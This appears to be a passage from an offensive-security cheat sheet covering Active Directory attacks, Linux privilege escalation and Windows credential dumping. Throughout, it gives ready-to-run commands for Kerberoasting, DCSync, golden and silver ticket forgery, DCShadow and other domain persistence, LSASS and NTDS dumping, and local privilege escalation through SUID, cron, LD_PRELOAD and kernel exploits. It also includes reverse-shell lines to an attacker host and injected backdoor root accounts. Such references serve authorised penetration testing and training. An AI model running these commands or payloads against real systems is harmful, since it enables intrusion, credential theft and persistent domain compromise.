python3 GetNPUsers.py htb.local/user:Password1 -dc-ip 10.10.110.146 -request

Output format:

$krb5asrep$23$bob@HTB.LOCAL:0c9c8a...

docs.title: Hashcat (mode 18200)
docs.text: hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force

docs.title: John the Ripper
docs.text: john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.hash

docs.title: Step 4: Reuse Cracked Credentials
docs.text:
nxc smb 10.10.10.10 -u bob -p 'Summer2022!' -d htb.local --shares

WinRM:

nxc winrm 10.10.10.10 -u bob -p 'Summer2022!' -d htb.local --exec "whoami"

docs.title: DCSync Attack
docs.text:
Tip

DCSync requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights — typically Domain Admins, Enterprise Admins, or explicitly delegated accounts. Use mimikatz lsadump::dcsync /user:krbtgt to dump the krbtgt hash for golden tickets.

Watch out

DCSync generates Event ID 4662 on the DC. On monitored environments, this will alert. Do it once, get what you need, stop.

docs.title: Requirements
docs.text:
• Domain Admin or Enterprise Admin, OR
  • Any account with Replicating Directory Changes and Replicating Directory Changes All rights on the domain object

docs.title: With PowerView
docs.text: Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "Replicating" }

docs.title: With BloodHound
docs.text: Find all principals with DCSync rights

docs.title: Dump krbtgt Hash
docs.text: lsadump::dcsync /domain:corp.local /user:krbtgt

docs.title: Dump Administrator Hash
docs.text: lsadump::dcsync /domain:corp.local /user:Administrator

docs.title: Dump All Users (Heavy Noise)
docs.text: lsadump::dcsync /domain:corp.local /all

docs.title: Dump Across Trusted Domain
docs.text: lsadump::dcsync /domain:child.corp.local /user:svc_sql

docs.title: Output Example
docs.text:
SAM Username : krbtgt
NTLM        : 1693c6cefafffc7af11ef34d1c788f47

Once you have the NTLM hash:

  • Use it for Golden Ticket attacks (krbtgt)
  • Use it for Pass-the-Hash (Administrator)
  • Crack it offline if needed

docs.title: Step 3: Crack the Hash (Optional)
docs.text:
hashcat -m 1000 krbtgt.hash rockyou.txt

john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt krbtgt.hash

docs.title: Practical Flow (From Admin Shell)
docs.text:
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
kerberos::golden /krbtgt:<hash> /domain:corp.local /sid:S-1-5-21-xxx... /user:admin /ptt

docs.title: Domain Enumeration
docs.text:
Tip

BloodHound collection first, analysis second. Throw the ZIP into BloodHound and run "Shortest Paths to Domain Admins" before spending time on manual enumeration — the graph almost always surfaces the path faster.

Watch out

SharpHound / bloodhound-python generates LDAP queries from every collector, SMB connections from SessionEnum, and SPN scans from ComputerOnly collectors. On monitored environments, pick your method (-CollectionMethod DCOnly, --auth-method ntlm) carefully.

docs.title: From Linux (bloodhound-python)
docs.text:
bloodhound-python -c all -d example.com -u <user> -p '<pass>' -ns 10.10.10.10 --zip

Noise-reduced (LDAP only, no sessionenum):

bloodhound-python -c DCOnly -d example.com -u <user> -p '<pass>' -ns 10.10.10.10 --zip

docs.title: From Windows (SharpHound)
docs.text:
.\SharpHound.exe -c All --zipfilename collection.zip
.\SharpHound.exe -c DCOnly --zipfilename dc-only.zip      # quietest
.\SharpHound.exe -c Session --loop --loopduration 02:00    # session data over 2h

docs.title: From Linux with nxc
docs.text: nxc ldap 10.10.10.10 -u <user> -p '<pass>' --bloodhound --collection All --dns-server 10.10.10.10

docs.title: ldapsearch — anonymous bind check
docs.text: ldapsearch -x -H ldap://10.10.10.10 -b "DC=example,DC=com" -s base

docs.title: Authenticated queries
docs.text:
# All domain users
ldapsearch -x -H ldap://10.10.10.10 -D '<user>@example.com' -w '<pass>' -b "DC=example,DC=com" "(objectClass=user)" samaccountname

# Users with SPNs (kerberoastable)
ldapsearch -x -H ldap://10.10.10.10 -D '<user>@example.com' -w '<pass>' -b "DC=example,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" samaccountname servicePrincipalName

# Users without Kerberos pre-auth (ASREP-roastable)
ldapsearch -x -H ldap://10.10.10.10 -D '<user>@example.com' -w '<pass>' -b "DC=example,DC=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samaccountname

# Domain Admins
ldapsearch -x -H ldap://10.10.10.10 -D '<user>@example.com' -w '<pass>' -b "DC=example,DC=com" "(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com)" samaccountname

# Password policy
ldapsearch -x -H ldap://10.10.10.10 -D '<user>@example.com' -w '<pass>' -b "DC=example,DC=com" -s base "(objectClass=*)" minPwdLength lockoutThreshold

docs.title: nxc (quick AD overview)
docs.text:
nxc smb 10.10.10.10 -u <user> -p '<pass>' --users
nxc smb 10.10.10.10 -u <user> -p '<pass>' --groups
nxc smb 10.10.10.10 -u <user> -p '<pass>' --pass-pol
nxc smb 10.10.10.10 -u <user> -p '<pass>' --loggedon-users
nxc smb 10.10.10.10 -u <user> -p '<pass>' --shares

docs.title: PowerView (From a Domain-Joined Shell)
docs.text:
PowerView's dev branch uses the Get-Domain* naming. Stock PowerSploit (older) uses Get-Net* — both appear in the wild, but the dev branch is current.

Import-Module .\PowerView.ps1

# Users
Get-DomainUser | Select samaccountname,description,memberof
Get-DomainUser -SPN                                          # kerberoastable
Get-DomainUser -PreauthNotRequired                            # ASREP-roastable
Get-DomainUser -AdminCount                                    # admin-flagged accounts

# Groups
Get-DomainGroup | Where-Object { $_.adminCount -eq 1 }
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins" -Recurse

# Computers
Get-DomainComputer | Select dnshostname,operatingsystem,operatingsystemversion

# GPOs
Get-DomainGPO
Get-DomainGPOUserLocalGroupMapping                           # where does GPO grant local admin?

# Trusts
Get-DomainTrust
Get-ForestTrust

# Current user's effective AD rights
Get-DomainUser -Identity $env:USERNAME -Properties memberof

docs.title: Key Targets for the First Pass
docs.text: Target Why it matters Query krbtgt Golden ticket target Get-DomainUser krbtgt Users with SPNs Kerberoasting Get-DomainUser -SPN Users without pre-auth ASREP-roasting Get-DomainUser -PreauthNotRequired adminCount=1 accounts Protected-from-ACL-reset list Get-DomainUser -AdminCount AS-REP disabled + admin Highest value Combine above Unconstrained delegation Coerce + dump TGT Get-DomainComputer -Unconstrained Constrained delegation S4U2Self/S4U2Proxy Get-DomainUser -TrustedToAuth ms-DS-MachineAccountQuota Can you join machines? (Get-DomainObject -Identity "DC=example,DC=com").'ms-DS-MachineAccountQuota'

docs.title: Trusts and Cross-Domain Enumeration
docs.text:
Get-DomainTrust
Get-DomainTrustMapping          # walks the trust graph recursively
Get-ForestTrust

From Linux:

nxc smb 10.10.10.10 -u <user> -p '<pass>' -M enum_trusts

Any bidirectional trust or "Forest" trust is worth mapping in BloodHound — misconfigurations in parent/child trusts frequently let a child DA hop to the forest root.

docs.title: Kerberoasting
docs.text:
Tool When to use Rubeus.exe kerberoast On a domain-joined Windows machine with a shell impacket-GetUserSPNs From Linux with valid domain credentials nxc ldap with --kerberoasting When you want NetExec format output

Tip

Target high-privilege service accounts first (those in Domain Admins, IT groups, etc.). Use BloodHound to identify which SPN accounts have paths to DA before cracking all hashes blindly.

docs.title: Pre-Access: SPN Enumeration with Valid Creds
Impacket GetUserSPNs.py
docs.text:
python3 GetUserSPNs.py example.com/web_svc:Diamond1 -dc-ip 10.10.10.10

Output:

ServicePrincipalName    Name        PasswordLastSet     LastLogon
----------------------  ----------  ------------------- ------------
MSSQLSvc/sql01.htb.local:1433  svc_sql      2023-01-10 14:12:00   ...

$krb5tgs$23$*svc_sql@HTB.EXAMPLE:...

Request the ticket in hashcat format:

python3 GetUserSPNs.py example.com/web_svc:Password1 -dc-ip 10.10.10.10 -request

Use hashcat -m 13100 for this hash type.

docs.title: Post-Access: SPN Enumeration from a Shell
Option A: PowerView
docs.text:
Import-Module .\PowerView.ps1
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

docs.title: Option B: Rubeus
docs.text:
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

Options:

  • Add /user:svc_sql to limit results
  • Use /format:hashcat for hashcat compatibility

docs.title: Crack with Hashcat
docs.text: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force

docs.title: Crack with John
docs.text: john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hashes.kerberoast

docs.title: Post-Crack: Reuse Credentials
docs.text:
nxc smb 10.10.10.10 -u svc_sql -p 'Summer2023!' -d example.com --shares

nxc winrm 10.10.10.10 -u svc_sql -p 'Summer2023!' -d example.com --exec "whoami"

docs.title: AD Persistence
docs.text:
Watch out

Golden tickets and shadow copies are high-noise persistence mechanisms. In a real engagement, document and demonstrate rather than leaving active backdoors — clean up after yourself.

docs.title: Extract the krbtgt Hash
docs.text:
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch

Output:

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47

docs.title: Forge a Golden Ticket
docs.text: mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

docs.title: Verify and Use
docs.text:
klist

.\PsExec.exe \\dc1 cmd.exe

docs.title: Create a Shadow Copy
docs.text:
C:\Tools\vshadow.exe -nw -p C:

Output:

- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

docs.title: Copy NTDS Database
docs.text:
copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows
tds
tds.dit c:
tds.dit.bak

docs.title: Extract SYSTEM Hive
docs.text: reg.exe save hklm\system c:\system.bak

docs.title: Dump Credentials Offline
docs.text:
Transfer ntds.dit.bak and system.bak to the attacker machine, then:

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

docs.title: DSRM Admin Account
docs.text: Every DC has a local Administrator account in Directory Services Restore Mode. If you enable password sync, you can log in to the DC with its hash using pass-the-hash over network logon.

docs.title: Dump DSRM hash from a DC
docs.text:
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

docs.title: Enable network logon for DSRM
docs.text: reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

docs.title: Use it
docs.text: impacket-psexec -hashes :<DSRM-NTLM> DC01/Administrator@10.10.10.10

docs.title: AdminSDHolder
docs.text:
The ACL on CN=AdminSDHolder,CN=System,DC=example,DC=com is copied to all protected accounts (adminCount=1) every 60 minutes by the SDProp process. Modifying AdminSDHolder's ACL creates persistent rights on Domain Admins and every other protected account.

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=example,DC=com' -PrincipalIdentity <attacker> -Rights All

Wait up to 60 minutes, then re-check Domain Admin ACLs — your rights will have propagated.

docs.title: SID History Injection
docs.text:
Modify a user's sidHistory attribute to include Enterprise Admins or DA SIDs. Kerberos trusts SIDs in the TGT regardless of current group membership — the user becomes effectively privileged even after the account is reset.

mimikatz # sid::add /sam:<attacker> /new:<DA-sid>

Requires DC-level access (DCShadow or direct NTDS write) — not a foothold technique, but durable once set.

docs.title: DCShadow
docs.text:
Register a rogue DC long enough to push ACL changes, backdoor accounts, or SID history modifications directly into the replication stream. Bypasses most DC audit logging.

mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:<user> /attribute:primaryGroupID /value:512
mimikatz # lsadump::dcshadow /push

Operational

DCShadow requires local SYSTEM on a machine with DC-level replication rights (DA or equivalent). It's a persistence amplifier — use it to entrench, not to escalate.

docs.title: Silver & Golden Ticket Attacks
docs.text:
Tip

Golden tickets require the krbtgt NTLM hash (get via DCSync or NTDS.dit dump). Silver tickets only require the service account hash — lower privilege to obtain but scoped to a single service. Use golden for persistence, silver for targeted lateral movement.

docs.title: Key Differences
docs.text: Feature Silver Ticket Golden Ticket Target Single service on a host (CIFS, HTTP) Any service / domain-wide Key Required NTLM hash of a service account NTLM hash of the krbtgt account Ticket Forged TGS (Service ticket) TGT (Ticket Granting Ticket) DC Interaction No (offline, stealthier) Yes (trusted by DC) Scope One service/host Full domain impersonation Detectability Lower Higher

docs.title: Requirements
docs.text:
• NTLM hash of the target service account
  • SPN and hostname of the target service
  • Domain SID and name

docs.title: Step 1: Obtain Service Account Hash
docs.text:
Retrieve via LSASS dump, ntds.dit, or DCSync:

RC4/NTLM: 4d28cf5252d39971419580a51484ca09

docs.title: Step 2: Forge Ticket
docs.text: mimikatz # kerberos::golden /user:jeffadmin /domain:corp.local /sid:S-1-5-21-1234... /target:web.corp.local /service:http /rc4:4d28cf... /ptt

docs.title: Step 3: Use the Ticket
docs.text:
klist

Invoke-WebRequest -UseDefaultCredentials http://web.corp.local

docs.title: Requirements
docs.text:
• NTLM hash of the krbtgt account
  • Domain SID and domain name
  • Username to impersonate

docs.title: Step 1: Dump krbtgt Hash via DCSync
docs.text:
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

Output:

NTLM: 1693c6cefafffc7af11ef34d1c788f47

docs.title: Step 2: Forge Ticket
docs.text: mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234... /krbtgt:1693c6ce... /ptt

docs.title: Step 3: Use the Ticket
docs.text:
klist

PsExec.exe \\dc01 cmd.exe

docs.title: Summary
docs.text: Feature Silver Ticket Golden Ticket Forged Ticket TGS TGT Scope Single host/service Entire domain Key Needed NTLM hash of service account NTLM hash of krbtgt DC Interaction None Yes Use Cases File shares, RDP, HTTP Domain Admin, DCSync, unrestricted impersonation

docs.title: Notes
docs.text:
• Silver Tickets for stealthy lateral movement; Golden Tickets for domain persistence
  • Use BloodHound or net group "Domain Admins" to identify ideal users to impersonate
  • kerberos::ptt can inject any .kirbi ticket independently

docs.title: Linux Privilege Escalation
docs.text:
Quick win order

  1. sudo -l — misconfigured sudo is the most common Linux privesc
  2. SUID binaries: find / -perm -4000 2>/dev/null — check against GTFOBins
  3. Writable cron jobs: cat /etc/cron* /etc/cron.d/* and check script permissions
  4. Running as a service account? Check what the service binary does and if it's writable
  5. Check /etc/passwd for writable entries
  6. Kernel version: uname -r — only exploit if nothing else works, kernel exploits are noisy

docs.title: Linux Capabilities, LD_PRELOAD & PATH Hijacking
docs.text: Run getcap -r / 2>/dev/null and check sudo -l for env_keep+=LD_PRELOAD early in enumeration — these are frequently misconfigured and give root without touching SUID binaries or cron jobs.

docs.title: Linux Capabilities
docs.text:
Capabilities grant specific elevated privileges to individual binaries without making them full SUID. Enumerate all:

getcap -r / 2>/dev/null

docs.title: cap_setuid — set arbitrary UID (root)
docs.text:
# Python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
perl -e 'use POSIX (setuid); setuid(0); exec "/bin/bash";'

# Node.js
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

docs.title: cap_dac_read_search — read any file regardless of permissions
docs.text:
# Read /etc/shadow directly if a tool has this capability
python3 -c 'print(open("/etc/shadow").read())'

# Or with tar
tar -cvf /dev/null /etc/shadow 2>/dev/null | tar -xvf - -O

docs.title: cap_net_raw — raw socket access
docs.text: A binary with this capability can sniff network traffic. Useful for credential capture on shared network segments.

docs.title: cap_sys_ptrace — attach to any process
docs.text:
Can be used to inject shellcode into a root-owned process:

gdb -p <root-process-pid>

GTFOBins has a Capabilities section for common binaries — check there before writing custom exploit code.

docs.title: LD_PRELOAD Hijacking
docs.text: If sudo -l shows env_keep+=LD_PRELOAD, you can inject a malicious shared library into any sudo-allowed binary.

docs.title: Check for the condition
docs.text:
sudo -l
# Look for: env_keep+=LD_PRELOAD

docs.title: Compile the malicious library
docs.text:
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles

docs.title: Exploit
docs.text: sudo LD_PRELOAD=/tmp/shell.so <any-sudo-allowed-command>

docs.title: PATH Hijacking
docs.text: A SUID binary or sudo script that calls a command using a relative path (e.g., service apache2 restart without /usr/sbin/service) is vulnerable if you can write to a directory earlier in $PATH.

docs.title: Find the vulnerable call
docs.text:
strings /usr/local/bin/target-binary | grep -v "/"
strace -e execve /usr/local/bin/target-binary 2>&1 | grep exec
ltrace /usr/local/bin/target-binary 2>&1

docs.title: Exploit
docs.text:
# Create a malicious replacement command
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Prepend your directory to PATH
export PATH=/tmp:$PATH

# Run the vulnerable binary
/usr/local/bin/target-binary

Watch out

PATH hijacking only works when the vulnerable binary runs with elevated privileges. Confirm with ls -lah /usr/local/bin/target-binary before spending time on it.

docs.title: Linux Credential Hunting
docs.text:
Tip

grep -r "password" /etc /home /var/www 2>/dev/null catches a surprising number of credentials in config files. Also check .bash_history, .bashrc, .profile, and /var/log/ for command history with embedded credentials.

docs.title: /etc/passwd and /etc/shadow
docs.text:
cat /etc/passwd
cat /etc/shadow
ls -lah /etc/shadow

If /etc/shadow is world-readable, extract hashes directly. Check for readable backups:

find / -name "shadow*" -type f -readable 2>/dev/null
cat /var/backups/shadow.bak

Crack hashes offline:

john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
hashcat -m 1800 shadow.bak /usr/share/wordlists/rockyou.txt

docs.title: SSH Private Keys
docs.text:
find / -name "id_rsa" -type f 2>/dev/null
find /home -name "*.pem" -o -name "*.ppk" 2>/dev/null
ls -lah ~/.ssh/id_rsa

If the key is encrypted, crack the passphrase:

ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

Use the decrypted key:

ssh -i id_rsa <user>@10.10.10.10

docs.title: Passwords in Config Files
docs.text:
grep -iR --color=always 'password' .
grep -r "password" /etc/
find / -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.json" \) -exec grep -i "password" {} + 2>/dev/null

docs.title: Lateral Movement via SSH Keys
docs.text:
ssh -i id_rsa <user>@10.10.10.10

If SSH agent forwarding is enabled:

ssh -A <user>@10.10.10.10
ssh <user>@10.10.10.10

docs.title: Cron, SUID & GUID Exploitation
docs.text:
Tip

For SUID binaries, check GTFOBins first before writing custom exploits — most common binaries have documented privesc paths. For cron, check if the script is writable OR if any directory in its path is writable (path injection).

Watch out

SUID on custom binaries (not standard Linux utils) is a red flag — these are often intentional CTF vectors. In real engagements, SUID on non-standard binaries can indicate misconfiguration worth investigating.

docs.title: Identify Misconfigured Cron Jobs
docs.text:
cat /etc/crontab
ls -lah /etc/cron.*
find /etc/cron* -writable -type f 2>/dev/null

docs.title: Exploit a Writable Cron Script
docs.text:
1. Confirm write access:

    ls -lah /home/joe/.scripts/user_backups.sh

  2. Inject a reverse shell:

    echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /home/joe/.scripts/user_backups.sh

  3. Start listener:

    nc -lvnp 4444

docs.title: Identify SUID/GUID Binaries
docs.text:
find / -perm -4000 -type f 2>/dev/null       # SUID binaries
find / -perm -u=s -o -perm -g=s 2>/dev/null  # SUID or GUID
find / -writable -type d 2>/dev/null          # Writable directories

docs.title: Exploit SUID Binaries
docs.text:
If find has SUID:

find . -exec /bin/sh -p \; -quit

If python has SUID:

python -c 'import os; os.setuid(0); os.system("/bin/sh")'

docs.title: Exploiting SUID via File Overwrite
docs.text:
If cp, tee, dd, or another file-writing binary has SUID, overwrite /etc/passwd to inject a root account.

  1. Read the current passwd file:

    cat /etc/passwd > /tmp/passwd.new

  2. Generate a password hash and append a UID 0 account:

    openssl passwd -1 -salt salt P@ssw0rd
# Paste the output into a new line:
echo 'backdoor:$1$salt$<hash>:0:0:root:/root:/bin/bash' >> /tmp/passwd.new

  3. Overwrite /etc/passwd using the SUID binary:

    # If cp has SUID
cp /tmp/passwd.new /etc/passwd

# If tee has SUID
tee /etc/passwd < /tmp/passwd.new

# If dd has SUID
dd if=/tmp/passwd.new of=/etc/passwd

  4. Switch to the injected account:

    su backdoor

Why /etc/passwd, not /etc/shadow

Modifying /etc/shadow only works if /etc/passwd still points at it. Writing a hash directly into /etc/passwd (the second field) is the more portable primitive — Linux falls back to it when /etc/shadow doesn't contain the user.

docs.title: Linux Kernel Exploitation
docs.text:
Watch out

Kernel exploits are a last resort — they can crash the system and are noisy. Always exhaust sudo, SUID, cron, and credential hunting before attempting kernel exploitation.

Tip

Use linux-exploit-suggester or linpeas to identify candidate exploits for the kernel version. Cross-reference with searchsploit to find a compiled PoC before attempting to build from source.

docs.title: Identify Kernel Version
docs.text:
uname -r
cat /proc/version
lsb_release -a
cat /etc/os-release

docs.title: Automated Suggestion Tools
docs.text:
# linux-exploit-suggester-2 (single Perl script, self-contained)
./linux-exploit-suggester-2.pl

# linpeas will run it automatically as part of its full scan
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

Manual searchsploit:

searchsploit "linux kernel $(uname -r | cut -d. -f1-2)"

docs.title: Pwnkit — CVE-2021-4034 (polkit)
docs.text: Affects most Linux distros with polkit installed (released Jan 2022, widely unpatched on old boxes). Works from unprivileged local user; no brute force or timing involved.

docs.title: Check Vulnerable Version
docs.text:
/usr/bin/pkexec --version
# Vulnerable: < 0.105-31+deb11u1 (Debian), < 0.120-4 (Ubuntu)

docs.title: Exploit
docs.text:
git clone https://github.com/ly4k/PwnKit /tmp/pwnkit
cd /tmp/pwnkit
./PwnKit

Single-binary version (no compiler required on target):

wget https://github.com/ly4k/PwnKit/raw/main/PwnKit -O /tmp/pk
chmod +x /tmp/pk
/tmp/pk

docs.title: DirtyPipe — CVE-2022-0847
docs.text:
Affects Linux kernel 5.8 through 5.10.101 / 5.15.24 / 5.16.10. Allows overwriting any readable file, including /etc/passwd and SUID binaries.

# Check kernel range
uname -r

git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits /tmp/dp
cd /tmp/dp && ./compile.sh
./exploit-1       # injects root backdoor via /etc/passwd
./exploit-2 /usr/bin/su "$(cat /etc/shadow)"  # hijacks SUID binary

docs.title: DirtyCow — CVE-2016-5195
docs.text:
Affects kernels 2.6.22 through 4.8.3. Still relevant on old embedded devices, air-gapped systems, and enterprise distros with long-lived kernels.

# Multiple PoCs at https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <new-password>
su firefart          # or ssh firefart@localhost

Watch out

DirtyCow has known kernel panic conditions on some systems. Confirm you can handle the target going down before running it in production-like environments.

docs.title: Compile and Execute a Generic Kernel Exploit
docs.text:
1. Match the exploit's target kernel range to uname -r.

  2. Transfer source:

    # On attacker
python3 -m http.server 80

# On target
wget http://<attacker-ip>/exploit.c -O /tmp/exploit.c

  3. Compile on target (most kernel exploits need target's headers):

    gcc /tmp/exploit.c -o /tmp/exploit -pthread

    If the target has no compiler, compile on a matching VM/container and transfer the binary.

  4. Execute:

    chmod +x /tmp/exploit
/tmp/exploit

docs.title: Linux Local Enumeration
docs.text:
Quick win order

  1. sudo -l — misconfigured sudo is the most common Linux privesc
  2. SUID binaries: find / -perm -4000 2>/dev/null — check against GTFOBins
  3. Writable cron jobs: cat /etc/cron* /etc/cron.d/* and check script permissions
  4. Running as a service account? Check what the service binary does and if it's writable
  5. Check /etc/passwd for writable entries
  6. Kernel version: uname -r — only exploit if nothing else works, kernel exploits are noisy

docs.title: Basic Host Information
docs.text:
whoami && id                 # Current user & groups
hostname && uname -a         # Hostname & system info
cat /etc/issue               # OS version
cat /etc/passwd              # User list
cat /etc/shadow              # If readable, privilege escalation possible
cat /etc/os-release          # OS release
dpkg -l                      # List all installed packages

docs.title: Active Sessions
docs.text:
w
who
last

docs.title: Cron Job Enumeration
docs.text:
crontab -l
cat /etc/crontab
ls -lah /etc/cron*
grep "CRON" /var/log/syslog

docs.title: Exploit a Writable Cron Job
docs.text:
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /path/to/script.sh
nc -lvnp 4444

docs.title: File Permission Enumeration
docs.text:
find / -writable -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # GUID

Check binary strings:

strings /usr/bin/passwd

docs.title: Sensitive Files
docs.text:
grep -iR --color=always 'password' .
grep -r "password" /etc/
find / -name "*.conf" -exec grep -i password {} \; 2>/dev/null
ls -l /etc/shadow

docs.title: Running Processes
docs.text:
ps aux | grep root
netstat -ano
ps aux
ss -anp

docs.title: Mounts
docs.text:
cat /etc/fstab
mount
lsblk

docs.title: Writable /etc/passwd
docs.text:
Only works if /etc/passwd is world-writable (rare but misconfigured systems and older CTFs). Check first:

ls -la /etc/passwd
# -rw-rw-rw-  → writable by anyone

If writable, inject a new root-equivalent account:

# Generate a DES hash (still accepted by /etc/passwd second field)
openssl passwd -1 -salt salt P@ssw0rd

# Append the account — UID 0 makes it root-equivalent
echo 'backdoor:$1$salt$vB.u3LdTp/JX5TjPzdTt00:0:0:root:/root:/bin/bash' >> /etc/passwd
su backdoor

docs.title: Abusing Sudo
docs.text:
sudo -l

Check any allowed binaries against GTFOBins for privesc paths.

docs.title: Windows Privilege Escalation
docs.text:
Quick win order

  1. whoami /priv — check for SeImpersonatePrivilege (Potato attacks), SeDebugPrivilege
  2. net localgroup administrators — already in admin group?
  3. Unquoted service paths: wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
  4. AlwaysInstallElevated: reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  5. Stored credentials: cmdkey /list, check for saved RDP/WinRM credentials
  6. Run winpeas.exe for a comprehensive sweep — cross-reference findings manually

docs.title: Windows Credential Dumping
docs.text:
If LSASS is protected (PPL enabled), dump SAM/SYSTEM offline: reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak then run impacket-secretsdump locally. No process injection required.

Watch out

LSASS dumps trigger EDR on most enterprise endpoints. Check for AV/EDR first with tasklist — look for CrowdStrike, SentinelOne, Defender, Carbon Black processes before touching LSASS.

docs.title: Via Registry Save
docs.text:
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system

Extract hashes (on attacker machine):

impacket-secretsdump -sam sam -system system LOCAL
pypykatz registry --sam sam system

docs.title: Via Mimikatz
docs.text:
mimikatz # token::elevate
mimikatz # lsadump::sam

docs.title: Mimikatz (Direct)
docs.text:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

docs.title: Minidump via comsvcs.dll (LOL Binary)
docs.text:
tasklist /FI "IMAGENAME eq lsass.exe"    # get PID
rundll32.exe comsvcs.dll, MiniDump <pid> C:\Temp\lsass.dmp full

Parse offline:

pypykatz lsa minidump lsass.dmp

docs.title: Procdump (Sysinternals)
docs.text:
procdump.exe -accepteula -ma lsass.exe lsass.dmp

Then parse with Mimikatz or pypykatz.

docs.title: Task Manager (GUI — when you have RDP)
docs.text: Open Task Manager → Details tab → right-click lsass.exe → Create Dump File. Transfer .dmp to attacker machine and parse offline.

docs.title: Via Shadow Copy (Preferred)
docs.text:
vssadmin create shadow /for=C:
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit C:\Temp\ntds.dit
reg save HKLM\SYSTEM C:\Temp\system

Transfer and extract:

impacket-secretsdump -ntds ntds.dit -system system LOCAL

docs.title: Via NetExec (Remote — if you have DA creds)
docs.text: nxc smb 10.10.10.10 -u Administrator -p 'Password1' --ntds

docs.title: Cached Credentials (DCC2)
docs.text:
Domain Cached Credentials stored locally for offline login. Crackable but slow (hashcat mode 2100).

mimikatz # sekurlsa::cache
mimikatz # sekurlsa::credman     # Windows Credential Manager

hashcat -m 2100 dcc2.hash rockyou.txt

docs.title: Remote SAM Dump (If You Have Admin Creds)
docs.text:
impacket-secretsdump CORP/Administrator:'Password1'@10.10.10.10
impacket-secretsdump Administrator@10.10.10.10 -hashes :<ntlm-hash>

docs.title: Windows Local Enumeration
docs.text:
Quick win order

  1. whoami /priv — SeImpersonatePrivilege → Potato attacks; SeBackup/SeRestore → shadow copy NTDS; SeDebug → LSASS dump
  2. net localgroup administrators — already admin?
  3. cmdkey /list and dir /s *.config *.xml unattend* — stored credentials everywhere
  4. AlwaysInstallElevated: reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  5. AutoLogon: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" — look for DefaultPassword
  6. Unquoted service paths and weak service permissions
  7. Run winpeas.exe for a comprehensive sweep — cross-reference findings manually

docs.title: System Information
docs.text:
systeminfo
hostname
ver
wmic os get Caption,Version,BuildNumber,OSArchitecture

Check for missing patches against known privesc CVEs:

wmic qfe get HotFixID,InstalledOn

Then feed systeminfo output to Watson or Windows-Exploit-Suggester-NG:

wes.py systeminfo.txt --impact "Elevation of Privilege"

docs.title: Stored Credentials
docs.text:
cmdkey /list                               # saved RDP/network credentials
rundll32.exe keymgr.dll,KRShowKeyMgr       # GUI credential manager (if you have desktop)
dir /s /b C:\Users\*unattend*.xml C:\Windows\Panther\*unattend*.xml
type C:\Windows\Panther\Unattend.xml       # may contain AdministratorPassword
findstr /si password *.xml *.ini *.config *.txt *.ps1 2>nul

PowerShell history (often contains full command lines with plaintext passwords):

Get-Content (Get-PSReadlineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

docs.title: AutoLogon Registry Check
docs.text:
